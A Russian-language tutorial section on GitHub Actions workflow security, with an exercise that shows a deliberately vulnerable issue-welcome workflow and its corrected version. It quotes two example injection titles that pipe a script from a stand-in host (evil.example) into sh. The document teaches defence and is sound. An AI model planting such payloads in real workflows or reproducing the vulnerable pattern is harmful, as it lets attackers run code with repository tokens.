Безопасность workflow

Workflow выполняет код с доступом к секретам и правом писать в репозиторий, поэтому его защищают как продакшен-сервер:

  • Минимум прав. Блок permissions на уровне файла или задания: по умолчанию contents: read, остальное — точечно. Токен GITHUB_TOKEN получает только перечисленные права.
  • Закреплять сторонние действия. Тег @v1 автор может перевесить на другой код. Для чужих действий надёжнее полный SHA коммита: uses: someone/action@8f4b7f8.... В 2025 году взлом популярного действия tj-actions/changed-files показал, чем это грозит: перевешенные теги начали выводить секреты в логи (из общих знаний).
  • Не подставлять данные события в run. run: echo "${{ github.event.pull_request.title }}" вставляет заголовок PR прямо в текст скрипта. Заголовок "; curl evil.example | sh; " выполнится. Значения передают через env и используют как переменную оболочки: "$TITLE".
  • Осторожно с pull_request_target. Это событие запускается с секретами и правами целевого репозитория даже для PR из чужого форка. Запускать в нём код из PR нельзя.

Задача 8. Уязвимый workflow ★★★ с подвохом

Workflow ниже приветствует автора нового issue и ставит метку. Найдите две проблемы безопасности и исправьте их.

# .github/workflows/welcome.yml
# on:
#   issues:
#     types: [opened]
# jobs:
#   welcome:
#     runs-on: ubuntu-latest
#     steps:
#       - run: |
#           echo "Новый issue: ${{ github.event.issue.title }}"
#           gh issue edit ${{ github.event.issue.number }} --add-label triage
#         env:
#           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

Зачем: заголовок issue пишет кто угодно в интернете. Подстановка ${{ }} происходит до запуска оболочки, поэтому заголовок "; curl https://evil.example/x.sh | sh; echo " выполнится с токеном репозитория. Такие уязвимости находили в workflow крупных открытых проектов (из общих знаний).

Решение и разбор
// welcome.yml
name: Welcome
on:
  issues:
    types: [opened]

permissions:
  issues: write

jobs:
  welcome:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Новый issue: $TITLE"
          gh issue edit "$NUMBER" --add-label triage --repo "$REPO"
        env:
          TITLE: ${{ github.event.issue.title }}
          NUMBER: ${{ github.event.issue.number }}
          REPO: ${{ github.repository }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

Первая проблема — подстановка данных события прямо в скрипт. Значения уходят в env, а скрипт использует переменные оболочки в кавычках. Оболочка не исполняет содержимое переменной, она подставляет его как строку. Вторая проблема — нет блока permissions: токен получал права по умолчанию, которые в старых репозиториях включают запись в код. Теперь у него только issues: write. --repo нужен потому, что шага checkout нет и gh не знает, в каком он репозитории.
